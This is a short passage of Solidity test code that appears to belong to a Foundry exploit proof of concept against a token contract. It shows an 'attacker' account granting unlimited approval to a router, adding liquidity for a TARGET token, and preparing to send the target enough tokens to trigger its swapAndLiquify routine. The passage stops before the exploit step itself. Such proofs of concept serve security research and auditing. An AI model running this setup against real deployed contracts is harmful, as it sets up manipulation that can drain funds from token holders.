        token.approve(routerAddr, type(uint256).max);
        router.addLiquidityETH{value: 50 ether}(
            TARGET,
            tokenAmountForLiquidity,
            0,
            0,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        // Give the target contract enough tokens to trigger swapAndLiquify.
        // numTokensSellToAddToLiquidity = 250000 * 10**6 * 10**9
